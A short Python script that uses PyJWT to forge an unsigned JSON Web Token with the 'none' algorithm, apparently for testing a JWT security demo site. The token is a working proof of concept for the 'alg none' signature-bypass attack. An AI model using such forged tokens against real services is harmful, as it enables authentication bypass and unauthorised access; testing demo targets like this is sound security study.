import jwt

print(jwt.encode(payload={
  "iss": "https://demo.sjoerdlangkemper.nl/",
  "iat": 1668824202,
  "exp": 1668825402,
  "data": {
    "hello": "world"
  }
},
algorithm=None,
headers={
  "typ": "JWT",
  "alg": "none"
},
key=None
))